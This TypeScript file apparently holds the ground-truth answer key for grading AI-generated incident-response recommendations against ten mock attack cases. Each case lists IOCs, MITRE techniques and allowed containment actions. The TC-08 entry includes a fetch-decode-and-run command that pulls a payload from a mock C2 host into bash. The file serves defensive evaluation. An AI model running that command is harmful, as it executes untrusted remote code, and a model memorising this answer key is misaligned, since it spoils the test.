/**
 * groundTruth.ts — deterministic, backend-only Expected/Allowed Recommendation for the 10 evaluation
 * Attack Cases (TC-01..TC-10). Defined INDEPENDENTLY of any AI output: every value here comes from the
 * test-case specification (resources/mock-attacks-tc/*.json — the Wazuh alert designed for each case) and
 * the VIGIX Knowledge Base (playbook.seed.ts allowedActions, mitre.seed.ts techniques). It is NEVER derived
 * from a generated Recommendation. The evaluator compares the real, AI-generated Recommendation against this.
 *
 * `allowedActions` are the Action Catalog codes the incident-type Playbook permits (the "allowed response");
 * an AI step whose action is outside this set fails Attack Alignment. `expectedPlaybook` is the playbook the
 * backend PlaybookSelector should deterministically choose from the case's MITRE technique.
 */
export interface TcGroundTruth {
  caseId: string;
  ruleId: string;
  attackName: string;
  attackType: string;
  expectedSeverity: "low" | "medium" | "high" | "critical";
  expectedMitre: string[];
  /** IOC values planted in the alert that a correct recommendation may target. */
  expectedIocs: { type: string; value: string }[];
  /** Action Catalog codes the incident-type playbook permits. */
  allowedActions: string[];
  expectedPlaybook: string;
  /** Whether Policy is expected to require a human approval for this case's containment. */
  approvalExpected: boolean;
  /** Known, real interventions that occurred while producing this case's data (findings, not fabrication). */
  knownFindings: string[];
}

export const TC_GROUND_TRUTH: TcGroundTruth[] = [
  {
    caseId: "TC-01", ruleId: "5712", attackName: "Brute Force", attackType: "SSH_BRUTE_FORCE",
    expectedSeverity: "medium", expectedMitre: ["T1110"],
    expectedIocs: [{ type: "ip", value: "185.220.101.45" }, { type: "user", value: "root" }],
    allowedActions: ["ACT-BLOCK-SOURCE-IP", "ACT-DISABLE-ACCOUNT"],
    expectedPlaybook: "PB-SSH-BRUTEFORCE", approvalExpected: true, knownFindings: [],
  },
  {
    caseId: "TC-02", ruleId: "100301", attackName: "Malware", attackType: "MALWARE",
    expectedSeverity: "high", expectedMitre: ["T1204.002"],
    expectedIocs: [{ type: "hash", value: "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f" }, { type: "file", value: "/home/finance/Downloads/Invoice_Q4_2026.xls.exe" }],
    allowedActions: ["ACT-ISOLATE-ENDPOINT", "ACT-BLOCK-DOMAIN", "ACT-BLOCK-URL", "ACT-BLOCK-SOURCE-IP", "ACT-KILL-PROCESS", "ACT-QUARANTINE-FILE", "ACT-BLOCK-HASH", "ACT-BLOCK-DESTINATION-IP"],
    expectedPlaybook: "PB-MALWARE", approvalExpected: true, knownFindings: [],
  },
  {
    caseId: "TC-03", ruleId: "100310", attackName: "Phishing", attackType: "PHISHING",
    expectedSeverity: "medium", expectedMitre: ["T1566.002"],
    expectedIocs: [{ type: "url", value: "http://vigix-mock-phish.net/o365/verify?id=hr.clerk" }, { type: "domain", value: "vigix-mock-phish.net" }, { type: "ip", value: "45.155.205.233" }, { type: "email", value: "it-support@vigix-mock-phish.net" }],
    allowedActions: ["ACT-QUARANTINE-EMAIL", "ACT-BLOCK-URL", "ACT-BLOCK-DOMAIN", "ACT-RESET-CREDENTIAL", "ACT-REVOKE-SESSION", "ACT-DISABLE-ACCOUNT", "ACT-ISOLATE-ENDPOINT"],
    expectedPlaybook: "PB-PHISHING", approvalExpected: true,
    knownFindings: ["Analyst manually promoted the EMAIL IOC to actionable so ACT-QUARANTINE-EMAIL had a targetable, evidence-backed target (INVENTED_TARGET / EMAIL_MESSAGE otherwise)."],
  },
  {
    caseId: "TC-04", ruleId: "100200", attackName: "Account Compromise", attackType: "ACCOUNT_COMPROMISE",
    expectedSeverity: "high", expectedMitre: ["T1078"],
    expectedIocs: [{ type: "ip", value: "91.219.236.14" }, { type: "user", value: "j.smith" }],
    allowedActions: ["ACT-DISABLE-ACCOUNT", "ACT-BLOCK-SOURCE-IP", "ACT-ISOLATE-ENDPOINT", "ACT-RESET-CREDENTIAL", "ACT-REVOKE-SESSION"],
    expectedPlaybook: "PB-ACCOUNT-COMPROMISE", approvalExpected: true, knownFindings: [],
  },
  {
    caseId: "TC-05", ruleId: "100300", attackName: "PowerShell", attackType: "POWERSHELL",
    expectedSeverity: "high", expectedMitre: ["T1059.001"],
    expectedIocs: [{ type: "url", value: "http://vigix-mock-stager.net/a.ps1" }, { type: "domain", value: "vigix-mock-stager.net" }, { type: "user", value: "hr.clerk" }],
    allowedActions: ["ACT-ISOLATE-ENDPOINT", "ACT-BLOCK-DOMAIN", "ACT-BLOCK-URL", "ACT-BLOCK-SOURCE-IP", "ACT-DISABLE-ACCOUNT", "ACT-KILL-PROCESS", "ACT-QUARANTINE-FILE", "ACT-BLOCK-HASH"],
    expectedPlaybook: "PB-POWERSHELL", approvalExpected: true, knownFindings: [],
  },
  {
    caseId: "TC-06", ruleId: "31103", attackName: "SQL Injection", attackType: "SQL_INJECTION",
    expectedSeverity: "medium", expectedMitre: ["T1190"],
    expectedIocs: [{ type: "ip", value: "194.87.29.10" }],
    allowedActions: ["ACT-BLOCK-SOURCE-IP"],
    expectedPlaybook: "PB-SQL-INJECTION", approvalExpected: true, knownFindings: [],
  },
  {
    caseId: "TC-07", ruleId: "100320", attackName: "Command & Control", attackType: "COMMAND_AND_CONTROL",
    expectedSeverity: "high", expectedMitre: ["T1071.001"],
    expectedIocs: [{ type: "ip", value: "193.142.146.212" }, { type: "domain", value: "vigix-mock-c2.net" }, { type: "url", value: "https://vigix-mock-c2.net/gate.php" }],
    allowedActions: ["ACT-BLOCK-DESTINATION-IP", "ACT-BLOCK-DOMAIN", "ACT-BLOCK-URL", "ACT-ISOLATE-ENDPOINT"],
    expectedPlaybook: "PB-C2", approvalExpected: true,
    knownFindings: ["System KB gap fixed during the run: PB-C2 was seeded and T1071.001 was added to the MITRE catalog (mitre.seed.ts) so the C2 technique validated and the playbook could be selected."],
  },
  {
    caseId: "TC-08", ruleId: "100330", attackName: "Suspicious Process", attackType: "SUSPICIOUS_PROCESS_EXECUTION",
    expectedSeverity: "medium", expectedMitre: ["T1059.004"],
    expectedIocs: [{ type: "process", value: "/tmp/.cache/kworkerd" }, { type: "command", value: "curl -s http://vigix-mock-c2.net/x | base64 -d | bash" }, { type: "file", value: "/tmp/.cache/kworkerd" }, { type: "hash", value: "c488c4fbeb112223e34b76b84e06e4d6a2dc1209a664ecda48d6feb4c4448d64" }],
    allowedActions: ["ACT-KILL-PROCESS", "ACT-QUARANTINE-FILE", "ACT-BLOCK-HASH", "ACT-ISOLATE-ENDPOINT"],
    expectedPlaybook: "PB-SUSPICIOUS-PROCESS", approvalExpected: true,
    knownFindings: ["Analyst manually added a COMMAND IOC so ACT-KILL-PROCESS met its COMMAND_LINE evidence requirement (INSUFFICIENT_EVIDENCE otherwise)."],
  },
  {
    caseId: "TC-09", ruleId: "100340", attackName: "Data Exfiltration", attackType: "DATA_EXFILTRATION",
    expectedSeverity: "high", expectedMitre: ["T1048"],
    expectedIocs: [{ type: "ip", value: "45.61.136.77" }, { type: "domain", value: "vigix-mock-exfil.net" }, { type: "url", value: "https://vigix-mock-exfil.net/upload" }],
    allowedActions: ["ACT-BLOCK-DESTINATION-IP", "ACT-BLOCK-DOMAIN", "ACT-BLOCK-URL", "ACT-ISOLATE-ENDPOINT"],
    expectedPlaybook: "PB-DATA-EXFIL", approvalExpected: true,
    knownFindings: ["System KB gap fixed during the run: PB-DATA-EXFIL was seeded and T1048 added to the MITRE catalog so the exfiltration technique validated and the playbook could be selected."],
  },
  {
    // TC-10 is labelled "Privilege Escalation"; the alert asserts T1098 (Account Manipulation — member added to
    // Domain Admins), which the backend PlaybookSelector deterministically maps to PB-ACCOUNT-COMPROMISE (it lists
    // T1098). Ground truth therefore expects PB-ACCOUNT-COMPROMISE for this technique — recorded as a finding.
    caseId: "TC-10", ruleId: "100350", attackName: "Privilege Escalation", attackType: "ACCOUNT_COMPROMISE",
    expectedSeverity: "critical", expectedMitre: ["T1098"],
    expectedIocs: [{ type: "user", value: "eviluser" }, { type: "user", value: "svc_helpdesk" }],
    allowedActions: ["ACT-DISABLE-ACCOUNT", "ACT-BLOCK-SOURCE-IP", "ACT-ISOLATE-ENDPOINT", "ACT-RESET-CREDENTIAL", "ACT-REVOKE-SESSION"],
    expectedPlaybook: "PB-ACCOUNT-COMPROMISE", approvalExpected: true,
    knownFindings: ["Technique T1098 mapped to PB-ACCOUNT-COMPROMISE (not PB-PRIV-ESC): 'member added to Domain Admins' is account manipulation. Expected playbook set to PB-ACCOUNT-COMPROMISE accordingly."],
  },
];

export const groundTruthByRule = (ruleId: string): TcGroundTruth | undefined => TC_GROUND_TRUTH.find((g) => g.ruleId === ruleId);
